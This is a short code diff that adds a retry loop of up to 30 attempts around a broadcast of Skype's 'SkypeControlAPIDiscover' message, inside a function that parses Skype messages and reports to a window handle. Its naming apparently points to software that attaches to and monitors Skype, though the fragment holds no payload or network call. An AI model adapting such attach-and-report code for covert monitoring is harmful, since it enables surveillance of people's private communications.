@@ -2283,7 +2283,10 @@ BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 	if (*pdwFlags & FLAGS_SKAPI_ATT) {
 		// Deve mandare il messaggio per il discovery
 		UINT msg_type = RegisterWindowMessage("SkypeControlAPIDiscover");
-		HM_SafeSendMessageTimeoutW(HWND_BROADCAST, msg_type, (WPARAM)g_report_hwnd, (LPARAM)NULL, SMTO_NORMAL, 500, NULL);
+		for (int i=0; i<30; i++) {
+			if (HM_SafeSendMessageTimeoutW(HWND_BROADCAST, msg_type, (WPARAM)g_report_hwnd, (LPARAM)NULL, SMTO_NORMAL, 500, NULL))
+				break;
+		}
 
 		return TRUE;
 	}
